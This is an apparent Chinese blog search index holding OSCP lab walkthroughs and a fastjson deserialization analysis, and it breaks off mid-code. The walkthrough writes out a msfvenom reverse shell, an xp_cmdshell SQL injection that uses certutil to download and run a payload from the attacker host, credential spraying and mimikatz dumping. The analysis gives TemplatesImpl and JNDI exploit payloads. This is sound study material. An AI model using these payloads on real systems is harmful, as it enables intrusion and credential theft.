<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OSCP--Challenge 2 - Relia</title>
      <link href="/oscp2/"/>
      <url>/oscp2/</url>
      
        <content type="html"><![CDATA[<h1 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h1><img src="/oscp2/map.png" class=""><style>table th:first-of-type {    width: 50%;}table th:nth-of-type(2) {    width: 50%;}</style><div style="text-align: center;">  <div style="display: inline-block; text-align: left;"><table><thead><tr><th><div style="width:400px">IP</div></th><th>Ports</th></tr></thead><tbody><tr><td>192.168.x.189</td><td>25、110、135、139、143、445、587、5985</td></tr><tr><td>192.168.x.191</td><td>80、135、139、445、3389、5985</td></tr><tr><td>192.168.x.245</td><td>21、80、443、2222、8000</td></tr><tr><td>192.168.x.246</td><td>80、443、2222</td></tr><tr><td>192.168.x.247</td><td>80、135、139、443、33889、5985</td></tr><tr><td>192.168.x.248</td><td>80、135、139、445、3389、5985</td></tr><tr><td>192.168.x.249</td><td>80、135、445、3389、5985、8000</td></tr><tr><td>192.168.x.250 （已知账密offsec/lab）</td><td>135、139、445、3389、5040</td></tr></tbody></table></div></div><h1 id="192-168-x-250"><a href="#192-168-x-250" class="headerlink" title="192.168.x.250"></a>192.168.x.250</h1>]]></content>
      
      
      <categories>
          
          <category> OSCP </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP--Challenge 1 - Medtech</title>
      <link href="/oscp1/"/>
      <url>/oscp1/</url>
      
        <content type="html"><![CDATA[<h1 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h1><img src="/oscp1/map.png" class=""><style>table th:first-of-type {    width: 50%;}table th:nth-of-type(2) {    width: 50%;}</style><div style="text-align: center;">  <div style="display: inline-block; text-align: left;"><table><thead><tr><th><div style="width:400px">IP</div></th><th>Ports</th></tr></thead><tbody><tr><td>192.168.x.120</td><td>22、80</td></tr><tr><td>192.168.x.121</td><td>80、135、139、445</td></tr><tr><td>192.168.x.122</td><td>22,、1194</td></tr></tbody></table></div></div><h1 id="192-168-x-121"><a href="#192-168-x-121" class="headerlink" title="192.168.x.121"></a>192.168.x.121</h1><p>分别对有web服务的120、121机器进行目录扫描，120机器未发现攻击点，但在121中有登录点，进行测试在用户名处发现sql注入并且是MSsql，可直接使用xp_cmdshell进行命令执行。</p><p>使用msfvenom生成exe，并使用msfconsole监听模块链接反弹的shell。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">生成exe木马命令msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.45.223 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> shlle.exe使用msfconsole监听use exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.45.223<span class="token builtin class-name">set</span> lport <span class="token number">4444</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在生成的shell.exe目录下使用python开启一个简单的web服务</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在sql注入中上传生成的shell.exe并执行此程序。</p><pre class="line-numbers language-none"><code class="language-none">SQL注入payload1:';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.223:9999/shell.exe c:/temp/shell.exe';--SQL注入payload1:';exec xp_cmdshell 'c:/temp/shell.exe';--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功接收到shell，但是并非管理员权限，接着继续上传winPEAS64.exe查看是否有相关提权漏洞。</p><p>在检测出来的结果中，发现了此用户具有SeImpersonaterPrivilege权限，有此权限后可使用<a href="https://github.com/itm4n/PrintSpoofer">烂土豆</a>进行提权。</p><img src="/oscp1/1.png" class=""><p>直接上传PrintSpoofer64.exe后执行提权命令即可提权成功。</p><img src="/oscp1/2.png" class=""><p>在administrator用户的桌面上发现flag文件proof.txt</p><img src="/oscp1/3.png" class=""><p>发现域用户joe、leon、mario、offsec、peach、wario、yoshi；非域用户offsec。</p><img src="/oscp1/9.png" class=""><p>上传mimikatz进行密码抓取，执行 sekurlsa::logonPasswords</p><img src="/oscp1/5.png" class=""><img src="/oscp1/6.png" class=""><p>发现只有joe可以查看对应的密码Flowers1，故在121机器上得到了一个域用户的账户密码joe/Flowers1。</p><p>在此机器上搭建frp隧道，进入内网。</p><p>122主机执行<code>frpc.exe -c frpc.ini</code></p><p>frpc.ini配置</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr = 192.168.45.223server_port = 7000[socks5]type = tcpplugin = socks5remote_port = 6000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kali执行<code>frps -c frps.ini</code></p><p>frps.ini配置</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port = 7000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在kali中使用编辑/etc/proxychains4.conf中的配置，即在末尾加上<code>socks5 192.168.45.223 6000</code>即可使用proxychains进行内网访问，如内网端口扫描<code>proxychains nmap 172.16.234.10-14 -sS -p 1-10000</code>。</p><img src="/oscp1/7.png" class=""><h1 id="192-168-x-122"><a href="#192-168-x-122" class="headerlink" title="192.168.x.122"></a>192.168.x.122</h1><p>机器120、122均开放了22端口，因为是web服务不会处于域中故使用非域用户offsec对这两台机器进行爆破尝试。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> offsec <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt <span class="token parameter variable">-M</span> ip.txt <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>122机器爆破成功，账号密码为offsec/password，直接ssh登录，在当前目录下发现flag文件local.txt</p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><div style="text-align: center;">  <div style="display: inline-block; text-align: left;"><table><thead><tr><th align="left"><div style="width:400px">IP</div></th><th align="center">Ports</th></tr></thead><tbody><tr><td align="left">172.16.x.10</td><td align="center">53、88、135、139、445、5985</td></tr><tr><td align="left">172.16.x.11</td><td align="center">135、445、5985</td></tr><tr><td align="left">172.16.x.12</td><td align="center">139、445、3389、5985</td></tr><tr><td align="left">172.16.x.13</td><td align="center">135、445、5985</td></tr><tr><td align="left">172.16.x.14</td><td align="center">22</td></tr><tr><td align="left">172.16.x.82</td><td align="center">135、445、3389</td></tr><tr><td align="left">172.16.x.83</td><td align="center">135、445、5985</td></tr></tbody></table></div></div><p>通过外网得到的信息有</p><ol><li>域用户：joe、leon、mario、offsec、peach、wario、yoshi</li><li>域用户账号密码：joe/Flowers1、普通用户账号密码：offsec/password</li><li>mario用户的ssh私钥登录文件</li></ol><h1 id="172-16-x-14"><a href="#172-16-x-14" class="headerlink" title="172.16.x.14"></a>172.16.x.14</h1><p>通过对内网的扫描发现只有14机器开放了22端口，故直接使用mario的私钥进行登录尝试，登录成功</p><img src="/oscp1/10.png" class=""><p>发现flag文件local.txt，此机器无法提权至root。</p><h1 id="172-16-x-11"><a href="#172-16-x-11" class="headerlink" title="172.16.x.11"></a>172.16.x.11</h1><p>对开放了5985端口的机器使用域用户<code>joe/Flowers1</code>进行登录，只有11机器可以登录成功</p><p>通过<code>net localgroup Administrators</code>命令可以列出本地管理员用户组的用户，joe在管理员用户组中。</p><img src="/oscp1/11.png" class=""><p>在当前目录下有个fileMonitorBackup.log文件，查看文件中的内容可以得到以下凭据，wario的NTLM可以解密即Mushroom!</p><pre class="line-numbers language-none"><code class="language-none">daisy  NTLM:abf36048c1cf88f5603381c5128feb8e toad   NTLM:5be63a865b65349851c1f11a067a3068  wario  NTLM:fdf36048c1cf88f5630381c5e38feb8e  Mushroom!goomba NTLM:8e9e1516818ce4e54247e71e71b5f436<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在joe的desktop目录下可以找到flag文件local.txt。</p><h1 id="172-16-x-83"><a href="#172-16-x-83" class="headerlink" title="172.16.x.83"></a>172.16.x.83</h1><p>使用wario/Mushroom!对其他机器的5985进行连接，发现83机器可以连接成功</p><p>并且在desktop目录下发现flag文件local.txt。此用户不在本地管理员组，故还需寻找提权点。</p><img src="/oscp1/12.png" class=""><p>上传winPEASx64.exe执行，可发现如何用户对auditTracker.exe都有操作权限，故直接上传木马覆盖此文件。</p><img src="/oscp1/13.png" class=""><p>使用msfvenom生成木文件后上传覆盖，并执行命令<code>sc.exe start auditTracker</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.45.223 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> auditTracker.execertutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-f</span> http://192.168.45.223:9999/auditTracker.exe auditTracker.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>反弹shell成功，并在administrator用户的桌面发现proof.txt文件。</p><img src="/oscp1/14.png" class=""><h1 id="172-16-x-82"><a href="#172-16-x-82" class="headerlink" title="172.16.x.82"></a>172.16.x.82</h1><p>对剩下的4个IP进行smb爆破尝试，使用已有的账号与密码进行撞库与密码喷洒。</p><p>users.txt</p><pre class="line-numbers language-none"><code class="language-none">goombadaisytoadyoshijoeleonmariooffsecpeachwario<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>password.txt</p><pre class="line-numbers language-none"><code class="language-none">Flowers1Mushroom!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ip.txt</p><pre class="line-numbers language-none"><code class="language-none">172.16.234.10172.16.234.12172.16.234.13172.16.234.82<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>批量爆破命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crackmapexec smb ip.txt <span class="token parameter variable">-u</span> users.txt <span class="token parameter variable">-p</span> password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破结果中显示4台机器均可以使用<code>yoshi/Mushroom!</code>登录成功。</p><p>使用psexec.py工具登录82机器，查看用户在管理员组。直接在管理员桌面下找到flag文件proof.txt。</p><img src="/oscp1/15.png" class=""><h1 id="172-16-x-12"><a href="#172-16-x-12" class="headerlink" title="172.16.x.12"></a>172.16.x.12</h1><p>12机器无法使用psexec工具利用，但是开启了3389端口，可以直接进行远程登录。使用redesktop命令连接会报错，连接失败。</p><img src="/oscp1/16.png" class=""><p>根据<a href="https://zhuanlan.zhihu.com/p/371497627">网上解决方案</a>，换一个工具使用，下载<code>remmina</code>后连接成功。并且在桌面发现flag文件local.txt。</p><img src="/oscp1/17.png" class=""><p>老规矩上传winPEASx64.exe执行，查看相关信息。</p><p>在c:/temp/backup.exe发现定时任务，直接上传木马进行覆盖即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.45.223 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> backup.execertutil <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-f</span> http://192.168.45.223:9999/backp.exe c:/temp/backup.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>本地使用<code>nc -lvvp 4444</code>进行监听接受shell。在administrator用户桌面即可找到flag文件proof.txt。</p><img src="/oscp1/18.png" class=""><p>上传mimikatz进行密码抓取，执行 <code>sekurlsa::logonPasswords</code>得到账号密码<code>leon/rabbit:)</code></p><img src="/oscp1/19.png" class=""><h1 id="172-16-x-13"><a href="#172-16-x-13" class="headerlink" title="172.16.x.13"></a>172.16.x.13</h1><p>13机器开放了5985，使用<code>leon/rabbit:)</code>进行连接</p><p>连接成功，发现可以直接查看administrator桌面下的flag文件proof.txt。</p><img src="/oscp1/20.png" class=""><h1 id="172-16-x-10"><a href="#172-16-x-10" class="headerlink" title="172.16.x.10"></a>172.16.x.10</h1><p>使用psexec.py工具进行连接，直接是系统权限，可以直接进入administrator桌面查看flag文件proof.txt。</p><img src="/oscp1/21.png" class=""><p>并且在桌面发现credentials.txt文件，查看是webo01的账号密码<code>offsec/century62hisan51</code></p><img src="/oscp1/22.png" class=""><h1 id="192-168-x-120"><a href="#192-168-x-120" class="headerlink" title="192.168.x.120"></a>192.168.x.120</h1><p>直接使用<code>offsec/century62hisan51</code>进行ssh登录</p><img src="/oscp1/23.png" class=""><p>寻找提权点，输入sudo -l后发现，可以直接su roo后输入offsec密码进行提权</p><img src="/oscp1/24.png" class=""><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> OSCP </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化漏洞分析</title>
      <link href="/fastjson/"/>
      <url>/fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson基础知识"><a href="#fastjson基础知识" class="headerlink" title="fastjson基础知识"></a>fastjson基础知识</h1><p>构建一个Student类进行序列化与反序列化的认识。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> number<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Properties</span> properties<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参构造函数！！！！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> number<span class="token punctuation">,</span><span class="token class-name">Properties</span> properties<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>number<span class="token operator">=</span>number<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>properties<span class="token operator">=</span>properties<span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参构造函数！！！！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"public属性，getName()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"public属性，setName()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"private属性，getNumber()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> number<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Properties</span> <span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"private属性，getProperties()方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> properties<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>使用JSON.toJSONString()将对象序列化为json格式的字符串，此方法序列化时需要设置一个SerializerFeature.WriteClassName属性值才会输出带@type类名的字符串。且在进行对象序列化时会执行所有的getter方法。</p><img src="/fastjson/01.png" class=""><img src="/fastjson/02.png" class=""><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>使用json.parse()方法将带@type指定类名的json字符串反序列为指定类对象时，无需额外指定类名；</p><p>使用json.parseObject()方法进行反序列化时，若指定类则返回对应的对象，不指定类则返回JSONObject类。</p><p>当json.parseObject()方法不指定类时，会先执行parse()后多执行了一个类型转化JSON.toJSON(obj)方法，即将反序列化后的对象转化为JSONObject类。</p><img src="/fastjson/03.png" class=""><p>分别执行parseObject和parse方法对比一下就一目了然。parseObject多调用了一部分方法即getter方法。</p><img src="/fastjson/04.png" class=""><img src="/fastjson/05.png" class=""><p>当json.parseObject()方法指定类时，输出结果和json.parse()方法一致。</p><img src="/fastjson/06.png" class=""><p>若反序列化时需要把private属性也还原出来则需要加入Feature.SupportNonPublicField 参数值。若不加此参数，虽然不能把private属性还原出来，但是也会调用相应的getter方法。</p><img src="/fastjson/07.png" class=""><img src="/fastjson/08.png" class=""><p>由于此处的getProperties()方法的返回类型为Properties类，此类继承了Hashtable类，Hashtable类又继承了Map类，所以此处反序列化时也调用此getter方法。</p><img src="/fastjson/09.png" class=""><h2 id="fastjson反序列化总结"><a href="#fastjson反序列化总结" class="headerlink" title="fastjson反序列化总结"></a>fastjson反序列化总结</h2><p>反序列化调用的setter方法需要满足：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>反序列化调用的getter方法需要满足：</p><ul><li>非静态函数</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或Atomiclnteget或AtomicLong</li></ul><h1 id="FastJson各版本反序列化漏洞"><a href="#FastJson各版本反序列化漏洞" class="headerlink" title="FastJson各版本反序列化漏洞"></a>FastJson各版本反序列化漏洞</h1><h2 id="1-2-22-lt-fastjson-lt-1-2-24"><a href="#1-2-22-lt-fastjson-lt-1-2-24" class="headerlink" title="1.2.22<=fastjson<=1.2.24"></a>1.2.22&lt;=fastjson&lt;=1.2.24</h2><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用</p><p>入口函数为getOutputProperties(),此方法满足fastjson反序列化时自动调用的getter方法。</p><p>会先进入newTransformer()方法。</p><img src="/fastjson/10.png" class=""><p>然后会进入到getTransletInstance()。</p><img src="/fastjson/11.png" class=""><p>最后会来到CC3链的利用。</p><img src="/fastjson/12.png" class=""><p>要想执行到defineTransletClasses()方法，_name不能为null, _class必须为null,因为 _class本身就为null，所以可以不用管。</p><p>接着来到defineTransletClasses()。</p><img src="/fastjson/13.png" class=""><p> 若想执行到loader.defineClass方法，则_tfactory不能为null否则会提前报错退出程序, _bytecodes即为恶意类的字节码。</p><p>经调试，还需要_outputProperties也不为空，因为入口getOutputProperties()方法即为 _outputProperties属性的getter方法。</p><p>此外还需要注意，传入的恶意类字节码需要经过base64编码并且恶意类需要继承AbstractTranslet类，因为Fastjson提取byte[]数组字段值时会进行Base64解码</p><p>最终利用链</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">getOutputProperties()---&gt;newTransformer()---&gt;TransformerImpl()---&gt;getTransletInstance()--&gt;defineTransletClasses()--&gt;defineClass()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>EXP</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token string">"恶意类字节码"</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"red6380"</span><span class="token punctuation">,</span><span class="token property">"_tfactory"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><h4 id="限制："><a href="#限制：" class="headerlink" title="限制："></a>限制：</h4><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p><p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p><p>入口方法为setAutoCommit()。此方法满足fastjson反序列化时自动调用的setter方法。</p><img src="/fastjson/14.png" class=""><p>this.conn在类的无参构造函数时赋值为null,所以会进入到this.connect()方法中。</p><p>很明显，此处为JNDI注入的入口点，只需要this.getDataSourceName()可控即可。</p><img src="/fastjson/15.png" class=""><p>setDataSourceName()方法即为设置getDataSourceName()值，此方法为dataSourceName属性的setter方法，同样满足fastjson反序列时自动调用的setter方法。</p><img src="/fastjson/16.png" class=""><p>EXP</p><pre class="line-numbers language-none"><code class="language-none">{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1089/Evi","autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="1-2-25-lt-Fastjson-lt-1-2-41绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-41绕过" class="headerlink" title="1.2.25<=Fastjson<=1.2.41绕过"></a>1.2.25&lt;=Fastjson&lt;=1.2.41绕过</h2><h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h3><p>1.2.25及之后版本多了一个checkAutoType方法来防护反序列化漏洞，其原理是通过黑名单的方式将可能造成反序列化漏洞的类禁止其反序列化对象。</p><img src="/fastjson/17.png" class=""><p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p><p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> expectClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'$'</span><span class="token punctuation">,</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> i<span class="token punctuation">;</span>                <span class="token class-name">String</span> deny<span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span 